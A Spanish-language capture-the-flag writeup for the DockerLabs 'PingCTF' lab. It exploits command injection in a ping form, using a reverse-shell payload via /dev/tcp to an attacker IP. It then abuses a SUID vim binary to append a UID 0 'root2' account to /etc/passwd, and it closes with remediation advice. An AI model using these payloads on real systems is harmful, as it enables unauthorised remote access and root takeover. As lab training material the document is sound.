# PingCTF (DockerLabs) — Writeup

Dificultad: fácil

Esta máquina tiene su gracia particular: el propio nombre te dice exactamente qué va a fallar. Una utilidad web que hace ping a lo que le pidas es, casi por definición, una invitación a colar algo más que una IP en ese campo de texto. Y la escalada final, en vez del típico `NOPASSWD` sobre un binario, recurre a una técnica bastante más elegante: fabricar un usuario propio directamente dentro de `/etc/passwd`, con superpoderes de root incluidos de fábrica.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

Esta máquina se resuelve en dos actos bien diferenciados y de dificultad creciente. El primero es identificar y explotar una inyección de comandos en una utilidad de "comprobación de conectividad" — el clásico patrón de aplicaciones que ejecutan `ping` en segundo plano sin sanitizar la entrada. El segundo es, ya con acceso al sistema, encontrar un binario SUID mal configurado y usarlo no para abrir una simple shell, sino para escribir directamente en la base de datos de usuarios del sistema. Es un ejemplo particularmente instructivo de hasta dónde puede llegar el abuso de un SUID sobre un editor de texto.

---

## Paso 0: levantar el laboratorio

```bash
unzip ping_ctf.zip
sudo bash auto_deploy.sh ping_ctf.tar
```

Con el contenedor desplegado, toca confirmar que responde:

```bash
ping -c 1 172.17.0.2
```

Respuesta correcta, sistema activo. A partir de aquí, reconocimiento estándar.

---

## Paso 1: escaneo de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

| Parámetro | Para qué sirve |
|---|---|
| `-p-` | Cubre los 65535 puertos TCP, no solo los típicos |
| `--open` | Solo muestra lo que está realmente abierto |
| `-sS` | Escaneo SYN, más rápido y algo más discreto que un connect scan completo |
| `--min-rate 5000` | Acelera el envío de paquetes para no eternizar el escaneo |
| `-n` / `-Pn` | Sin resolución DNS ni fase de descubrimiento por ping, ya sabemos que el host vive |

Resultado: un único puerto abierto.

- **80/tcp** — HTTP

Con solo web disponible, ampliamos el detalle:

```bash
nmap -sCV -p80 172.17.0.2
```

Esto añade detección de versión (`-sV`) y los scripts de enumeración por defecto (`-sC`), para tener una foto más completa del servidor antes de tocar nada manualmente.

---

## Paso 2: la utilidad que hace ping por ti (y por cualquiera)

Al entrar en `http://172.17.0.2` aparece una herramienta llamada algo así como "Connectivity Check Utility": un formulario donde se introduce una IP o un nombre de host, y la aplicación devuelve el resultado de comprobar su conectividad.

Este tipo de funcionalidad es un clásico sospechoso de inyección de comandos. La razón es sencilla: para "comprobar conectividad", lo más probable es que el backend esté literalmente construyendo una cadena con el comando `ping` del sistema operativo e insertando ahí lo que el usuario escribe, sin validar nada. Si eso es cierto, cualquier carácter de separación de comandos en shell — `;`, `&&`, `|`, backticks — debería permitir colar comandos adicionales.

Se prueba con el carácter más directo:

```
;
```

Y en efecto, funciona. El punto y coma en bash separa dos comandos independientes: se ejecuta el primero (el ping legítimo) y a continuación el segundo, sin importar el resultado del anterior. La aplicación no está sanitizando el campo de entrada en absoluto.

---

## Paso 3: de la inyección a una shell interactiva

Con la inyección confirmada, toca ponerse en modo receptor. En la máquina atacante:

```bash
sudo nc -lvnp 4444
```

Y en el campo vulnerable del formulario web, se introduce el payload que combina el comando legítimo con la inyección real:

```bash
127.0.0.1 ; bash -c "bash -i >& /dev/tcp/192.168.0.104/4444 0>&1"
```

El primer fragmento (`127.0.0.1`) mantiene la apariencia de un uso normal de la herramienta. Tras el `;`, se lanza una bash interactiva cuyos descriptores de entrada, salida y error se redirigen hacia la IP y puerto del listener, usando la funcionalidad de redirección de red que bash ofrece a través de `/dev/tcp`.

Al enviar el formulario, el listener recibe la conexión: reverse shell obtenida, con los privilegios del usuario que ejecuta el servicio web (normalmente algo como `www-data`, bastante limitado).

---

## Paso 4: estabilizar la shell antes de tocar nada más

Una reverse shell recién obtenida suele ser bastante primitiva: sin autocompletado, sin historial, y capaz de romperse con cualquier combinación de teclas como Ctrl+C. Antes de empezar cualquier enumeración de escalada de privilegios, conviene arreglarla:

```bash
script /dev/null -c bash
```

Suspender la sesión momentáneamente:

```
Ctrl + Z
```

Ajustar la terminal local en la máquina atacante:

```bash
stty raw -echo; fg
```

Restaurar el entorno visual:

```bash
reset xterm
export TERM=xterm
export BASH=bash
```

Con esto la shell se comporta como una terminal completa: permite usar `su`, editores como `vim` o `nano`, combinaciones de teclas, y en general cualquier herramienta interactiva sin comportamientos raros. Un paso que muchas veces se salta con prisa, y que después se paga con sesiones que se cuelgan en el peor momento.

---

## Paso 5: buscando el atajo hacia root — enumeración de SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

El bit SUID permite que un binario se ejecute con los privilegios de su propietario, en lugar de los del usuario que lo lanza. Cuando el propietario es root, cualquier acción que ese binario permita realizar (leer, escribir, ejecutar comandos) se hereda con privilegios de root, sin importar quién lo esté ejecutando.

Entre el listado de binarios con SUID activo aparece uno que no debería estar ahí:

```
/usr/bin/vim.basic
```

Un editor de texto con SUID y propiedad de root es de manual: GTFOBins documenta explícitamente cómo aprovechar esta configuración, ya que vim permite tanto leer y escribir archivos arbitrarios como ejecutar comandos del sistema desde su propio entorno.

---

## Paso 6: escalada — no una shell, sino un usuario nuevo con UID 0

Aquí la técnica se aparta un poco del clásico `:shell` de vim visto en otras máquinas, y va un paso más allá: en vez de abrir una shell heredando privilegios de forma temporal, se aprovecha el SUID para escribir directamente una nueva entrada de usuario en `/etc/passwd`, con privilegios de administrador permanentes.

### 6.1 — Generar el hash de la contraseña

Linux nunca almacena contraseñas en texto plano, así que hace falta generar un hash compatible antes de insertarlo:

```bash
openssl passwd -1 -salt hack password
```

- `-1` indica el algoritmo MD5-Crypt (identificable por el prefijo `$1$` en el resultado).
- `-salt hack` fija la sal usada en el hash, aportando variabilidad y haciendo el resultado reproducible con esos parámetros concretos.
- `password` es la contraseña en texto plano elegida para la nueva cuenta.

Resultado:

```
$1$hack$Qfvz92fBAtSC9ccCE6BES0
```

### 6.2 — Inyectar la nueva cuenta usando el SUID de vim

```bash
echo "root2:\$1\$hack\$Qfvz92fBAtSC9ccCE6BES0:0:0:root:/root:/bin/bash" | /usr/bin/vim.basic -e -s -c ':g/./d' -c ':r /dev/stdin' -c ':w! >> /etc/passwd' -c ':q!' /etc/passwd
```

Desglosando cada pieza:

- La línea generada por `echo` sigue el formato estándar de `/etc/passwd`: `usuario:hash:UID:GID:comentario:home:shell`. Con **UID 0** y **GID 0**, el nuevo usuario `root2` queda al mismo nivel de privilegios que root, aunque tenga un nombre distinto. Las barras invertidas antes de cada `$` evitan que bash intente interpretar esos símbolos como variables de entorno.
- `vim.basic -e -s` arranca vim en modo Ex y en modo silencioso, permitiendo automatizar comandos sin abrir ninguna interfaz visual.
- `:g/./d` vacía el búfer de vim, eliminando cualquier contenido cargado por defecto.
- `:r /dev/stdin` lee el contenido recibido por la tubería (la línea generada por `echo`) y lo carga en el búfer.
- `:w! >> /etc/passwd` fuerza la escritura, concatenando (`>>`) el contenido del búfer al final del archivo real `/etc/passwd`. Esto solo es posible porque vim.basic se ejecuta con privilegios de root gracias al SUID — un usuario normal jamás podría escribir directamente sobre ese archivo.
- `:q!` cierra vim sin más cambios.

### 6.3 — Confirmar que la cuenta se creó

```bash
cat /etc/passwd | tail -n 3
```

La última línea debería mostrar exactamente la entrada añadida:

```
root2:$1$hack$Qfvz92fBAtSC9ccCE6BES0:0:0:root:/root:/bin/bash
```

---

## Paso 7: la coronación

```bash
su root2
```

Se introduce la contraseña elegida (`password`), y la sesión pasa a ejecutarse bajo el nuevo usuario. Aunque el nombre no sea literalmente "root", lo que importa de verdad es el UID:

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

En Linux, cualquier cuenta con `UID=0` tiene privilegios administrativos completos, sin importar cómo se llame. Escalada completada.

---

## Resumen técnico

| Fase | Detalle |
|---|---|
| Vulnerabilidad inicial | Inyección de comandos en formulario de "connectivity check" |
| Carácter de inyección | `;` |
| Acceso obtenido | Reverse shell como usuario del servicio web |
| Vector de escalada | Binario `vim.basic` con SUID activo, propiedad de root |
| Técnica de escalada | Inyección de nueva entrada UID 0 en `/etc/passwd` |
| Resultado final | Cuenta `root2` con privilegios completos de root |

---

## Qué falló aquí (y cómo se evita)

1. **Ejecución de comandos del sistema construidos con entrada del usuario sin sanitizar.** Cualquier funcionalidad que internamente ejecute utilidades de sistema (`ping`, `traceroute`, `nslookup`, etc.) debe validar rigurosamente la entrada, idealmente mediante listas blancas de caracteres permitidos, y nunca concatenando directamente la entrada del usuario en una cadena de shell.
2. **Bit SUID activo sobre un editor de texto de propósito general.** Vim, como cualquier binario capaz de leer, escribir o ejecutar comandos arbitrarios, jamás debería tener el bit SUID activo salvo necesidad extremadamente justificada y auditada. GTFOBins existe precisamente para catalogar este tipo de configuraciones peligrosas por binario.
3. **Ausencia de integridad monitorizada sobre archivos críticos como `/etc/passwd`.** Un sistema con herramientas de detección de integridad de archivos (como AIDE o Tripwire) habría marcado de inmediato una modificación no autorizada sobre la base de datos de usuarios, permitiendo detectar el ataque casi en tiempo real.

---

## Referencias

- GTFOBins — vim: https://gtfobins.github.io/gtfobins/vim/
- DockerLabs: https://dockerlabs.es/
